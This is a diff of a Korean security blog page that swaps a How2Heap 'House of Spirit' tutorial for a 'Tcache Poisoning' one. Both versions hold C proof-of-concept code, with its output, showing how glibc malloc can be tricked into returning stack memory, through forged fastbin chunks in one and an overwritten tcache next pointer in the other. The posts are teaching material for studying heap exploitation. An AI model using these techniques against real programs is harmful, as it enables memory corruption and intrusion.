@@ -14,26 +14,26 @@
     
 
     
-    <title>[How2Heap] House_of_spirit | j0n9hyun</title>
+    <title>[How2Heap] Tcache_Poisoning | j0n9hyun</title>
     
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
         <meta name="keywords" content="Theory">
     
-    <meta name="description" content="House_of_spirit.c 1234567891011121314151617181920212223242526272829303132333435#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main()&amp;#123;fprintf(stderr, &quot;house of spirit\n&quot;);fprintf(stderr, &quot;m">
+    <meta name="description" content="Tcache_Poisoning 1234567891011121314151617181920212223242526272829303132333435#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;stdint.h&amp;gt;int main()&amp;#123;fprintf(stderr, &quot;이것은 malloc을 속여">
 <meta name="keywords" content="Theory">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[How2Heap] House_of_spirit">
-<meta property="og:url" content="http://j0n9hyun.github.io/2019/05/29/How2Heap-House-of-spirit-c/index.html">
+<meta property="og:title" content="[How2Heap] Tcache_Poisoning">
+<meta property="og:url" content="http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-Poisoning/index.html">
 <meta property="og:site_name" content="j0n9hyun">
-<meta property="og:description" content="House_of_spirit.c 1234567891011121314151617181920212223242526272829303132333435#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main()&amp;#123;fprintf(stderr, &quot;house of spirit\n&quot;);fprintf(stderr, &quot;m">
+<meta property="og:description" content="Tcache_Poisoning 1234567891011121314151617181920212223242526272829303132333435#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;stdint.h&amp;gt;int main()&amp;#123;fprintf(stderr, &quot;이것은 malloc을 속여">
 <meta property="og:locale" content="ko">
-<meta property="og:updated_time" content="2019-05-29T07:16:06.112Z">
+<meta property="og:updated_time" content="2019-06-26T14:46:22.491Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="[How2Heap] House_of_spirit">
-<meta name="twitter:description" content="House_of_spirit.c 1234567891011121314151617181920212223242526272829303132333435#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;int main()&amp;#123;fprintf(stderr, &quot;house of spirit\n&quot;);fprintf(stderr, &quot;m">
+<meta name="twitter:title" content="[How2Heap] Tcache_Poisoning">
+<meta name="twitter:description" content="Tcache_Poisoning 1234567891011121314151617181920212223242526272829303132333435#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;stdint.h&amp;gt;int main()&amp;#123;fprintf(stderr, &quot;이것은 malloc을 속여">
     
-	<link rel="canonical" href="http://j0n9hyun.github.io/2019/05/29/how2heap-house-of-spirit-c/">
+	<link rel="canonical" href="http://j0n9hyun.github.io/2019/06/26/how2heap-tcache-poisoning/">
 
     
 
@@ -150,14 +150,14 @@
 </div>
 
                         <div class="main-body-content">
-                            <article id="post-How2Heap-House-of-spirit-c" class="article article-single article-type-post" itemscope itemprop="blogPost">
+                            <article id="post-How2Heap-Tcache-Poisoning" class="article article-single article-type-post" itemscope itemprop="blogPost">
     <div class="article-inner">
         
             <header class="article-header">
                 
     
         <h1 class="article-title" itemprop="name">
-        [How2Heap] House_of_spirit
+        [How2Heap] Tcache_Poisoning
         </h1>
     
 
@@ -167,8 +167,8 @@
             <div class="article-meta">
                 
     <div class="article-date">
-        <a href="/2019/05/29/How2Heap-House-of-spirit-c/" class="article-date">
-            <time datetime="2019-05-29T07:05:24.000Z" itemprop="datePublished">2019-05-29</time>
+        <a href="/2019/06/26/How2Heap-Tcache-Poisoning/" class="article-date">
+            <time datetime="2019-06-26T14:42:03.000Z" itemprop="datePublished">2019-06-26</time>
         </a>
     </div>
 
@@ -180,23 +180,30 @@
         <a class="tag-link" href="/tags/Theory/">Theory</a>
     </div>
 
-  			<span class="reading-time">⏱ 4 분</span>
+  			<span class="reading-time">⏱ 3 분</span>
             </div>
         
         
         <div class="article-entry" itemprop="articleBody">
-            <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="house_of_spiritc"><a class="markdownIt-Anchor" href="#house_of_spiritc"></a> House_of_spirit.c</h3>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"house of spirit\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc을 한 번 호출해서 메모리를 설정한다.\n"</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 fake fastbin 영역을 가리키는 포인터를 overwirte할 것이다.\n"</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line"><span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 영역(메모리 길이: %lu)은 chunk가 2개 있다. 첫번째는 %p에서 시작하고 두번째는 %p에서 시작한다.\n"</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이 영역의 chunk 크기는 fastbins에 속하는 영역(x64: &lt;= 128bytes)보다 큰 16bytes 이상이어야 한다.(chunk data를 수용하기 위해) PREV_INUSE(lsb)는 fastbin-sized chunk의 free로 무시되지만 IS_MMAPPED(second lsb)나 NON_MAIN_ARENA(third lsb)는 문제를 야기한다.\n"</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n"</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"*next* fake 영역의 chunk 크기는 온전해야 한다. 그것은 &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (main arena는 기본적으로 &lt; 128kb)이 nextsize 무결성 체크를 통과한다.그래서 fastbin 크기가 필요 없다.\n"</span>);</span><br><span class="line"><span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이제 포인터를 첫번째 fake chunk안에 있는 fake 영역의 주소로 overwrite할 것이다, %p.\n"</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n"</span>);</span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"overwrite된 포인터를 free한다.\n"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free(a)-------\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"next malloc은 %p에 있는 fake chunk의 영역을 반환할 것이다. 그러면 %p이 될 것이다!\n"</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(0x30): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><code>house of spirit</code><br>
-malloc을 한 번 호출해서 메모리를 설정한다.<br>
-이제 fake fastbin 영역을 가리키는 포인터를 overwirte할 것이다.<br>
-이 영역(메모리 길이: 80)은 chunk가 2개 있다. 첫번째는 <code>0x7fffffffe338</code>에서 시작하고 두번째는 <code>0x7fffffffe378</code>에서 시작한다.<br>
-이 영역의 chunk 크기는 fastbins에 속하는 영역(x64: &lt;= 128bytes)보다 큰 16bytes 이상이어야 한다.(chunk data를 수용하기 위해) PREV_INUSE(lsb)는 fastbin-sized chunk의 free로 무시되지만 IS_MMAPPED(second lsb)나 NON_MAIN_ARENA(third lsb)는 문제를 야기한다.<br>
-이제 포인터를 첫번째 fake chunk안에 있는 fake 영역의 주소로 overwrite할 것이다, <code>0x7fffffffe338</code><br>
-overwrite된 포인터를 free한다.<br>
+            <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="tcache_poisoning"><a class="markdownIt-Anchor" href="#tcache_poisoning"></a> Tcache_Poisoning</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"이것은 malloc을 속여서 pointer를 임의의 위치(이 경우, 스택)로\n"</span></span><br><span class="line"><span class="string">"반환하는 간단한 tcache poisoning 공격이다.\n"</span></span><br><span class="line"><span class="string">"이 공격은 fastbin corruption 공격과 매우 비슷하다.\n\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> stack_var;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc()을 반환할 주소는 %p이다.\n"</span>, (<span class="keyword">char</span> *)&amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"buffer를 한 개 할당한다.\n"</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"malloc(128): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"buffer를 free한다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"-------free(a)-------"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"tcache list : [ %p ]\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"조작할 위치(%p)를 가리키도록 %p에 있는 데이터의\n"</span></span><br><span class="line"><span class="string">"처음 %lu 바이트(fd/next pointer)를 overwrite한다.\n"</span>, &amp;stack_var, a, <span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>));</span><br><span class="line">a[<span class="number">0</span>] = (<span class="keyword">intptr_t</span>)&amp;stack_var;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(128): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">128</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"tcache list : [ %p ]\n"</span>, &amp;stack_var);</span><br><span class="line"></span><br><span class="line"><span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(128): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"조작에 성공했다.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<center>
+<p>이것은 malloc을 속여서 pointer를 임의의 위치(이 경우, 스택)로<br>
+반환하는 간단한 <code>tcache poisoning</code> 공격이다.<br>
+이 공격은 fastbin corruption 공격과 매우 비슷하다.</p>
+<p>malloc()을 반환할 주소는 <code>0x7fffb6be4b80</code>이다.<br>
+buffer를 한 개 할당한다.<br>
+<code>malloc(128): 0x55b69dc26260</code><br>
+buffer를 free한다.<br>
 -------free(a)-------<br>
-next malloc은 <code>0x7fffffffe338</code>에 있는 fake chunk의 영역을 반환할 것이다. 그러면 <code>0x7fffffffe340</code>이 될 것이다!<br>
-<code>malloc(0x30): 0x7fffffffe340</code></p>
+<code>tcache list : [ 0x55b69dc26260 ]</code><br>
+조작할 위치(0x7fffb6be4b80)를 가리키도록 <code>0x55b69dc26260</code>에 있는 데이터의<br>
+처음 8 바이트(fd/next pointer)를 overwrite한다.<br>
+<code>1st malloc(128): 0x55b69dc26260</code></p>
+<h4 id="tcache-list-0x7fffb6be4b80"><a class="markdownIt-Anchor" href="#tcache-list-0x7fffb6be4b80"></a> <strong><code>tcache list : [ 0x7fffb6be4b80 ]</code></strong></h4>
+<h4 id="2nd-malloc128-0x7fffb6be4b80"><a class="markdownIt-Anchor" href="#2nd-malloc128-0x7fffb6be4b80"></a> <strong><code>2nd malloc(128): 0x7fffb6be4b80</code></strong></h4>
+<p>조작에 성공했다.</p>
+</center>
 
         </div>
         <footer class="article-footer">
@@ -204,7 +211,7 @@ next malloc은 <code>0x7fffffffe338</code>에 있는 fake chunk의 영역을 반
 
 
 
-    <a data-url="http://j0n9hyun.github.io/2019/05/29/How2Heap-House-of-spirit-c/" data-id="cjxdcqk1u000al0fp0b61a4y5" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
+    <a data-url="http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-Poisoning/" data-id="cjxdcqk21000kl0fp9gn0s8t4" class="article-share-link"><i class="fa fa-share"></i>공유하기</a>
 <script>
     (function ($) {
         $('body').on('click', function() {
@@ -274,17 +281,17 @@ next malloc은 <code>0x7fffffffe338</code>에 있는 fake chunk의 영역을 반
             "@type": "Person",
             "name": "j0n9hyun"
         },
-        "headline": "[How2Heap] House_of_spirit",
+        "headline": "[How2Heap] Tcache_Poisoning",
         "image": "http://j0n9hyun.github.io",
         "keywords": "Theory",
         "genre": "Theory",
-        "datePublished": "2019-05-29",
-        "dateCreated": "2019-05-29",
-        "dateModified": "2019-05-29",
-        "url": "http://j0n9hyun.github.io/2019/05/29/How2Heap-House-of-spirit-c/",
-        "description": " House_of_spirit.c
-1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123;fprintf(stderr, "house of spirit\n");fprintf(stderr, "m"
-        "wordCount": 487
+        "datePublished": "2019-06-26",
+        "dateCreated": "2019-06-26",
+        "dateModified": "2019-06-26",
+        "url": "http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-Poisoning/",
+        "description": " Tcache_Poisoning
+1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;int main()&#123;fprintf(stderr, "이것은 malloc을 속여"
+        "wordCount": 292
     }
 </script>
 
@@ -332,20 +339,10 @@ next malloc은 <code>0x7fffffffe338</code>에 있는 fake chunk의 영역을 반
         
 <nav id="article-nav">
     
-        <a href="/2019/05/31/How2Heap-Poison-null-byte/" id="article-nav-newer" class="article-nav-link-wrap">
-        <strong class="article-nav-caption">다음 글</strong>
-        <p class="article-nav-title">
-        
-            [How2Heap] Poison_null_byte
-        
-        </p>
-        <i class="icon fa fa-chevron-right" id="icon-chevron-right"></i>
-    </a>
     
-    
-        <a href="/2019/05/29/How2Heap-unsafe-unlink-c/" id="article-nav-older" class="article-nav-link-wrap">
+        <a href="/2019/06/26/How2Heap-Tcache-dup/" id="article-nav-older" class="article-nav-link-wrap">
         <strong class="article-nav-caption">이전 글</strong>
-        <p class="article-nav-title">[How2Heap] unsafe_unlink</p>
+        <p class="article-nav-title">[How2Heap] Tcache_dup</p>
         <i class="icon fa fa-chevron-left" id="icon-chevron-left"></i>
         </a>
     
@@ -455,7 +452,7 @@ next malloc은 <code>0x7fffffffe338</code>에 있는 fake chunk의 영역을 반
     var disqus_shortname = 'j0n9hyun';
     
     
-    var disqus_url = 'http://j0n9hyun.github.io/2019/05/29/How2Heap-House-of-spirit-c/';
+    var disqus_url = 'http://j0n9hyun.github.io/2019/06/26/How2Heap-Tcache-Poisoning/';
     
     (function() {
     var dsq = document.createElement('script');
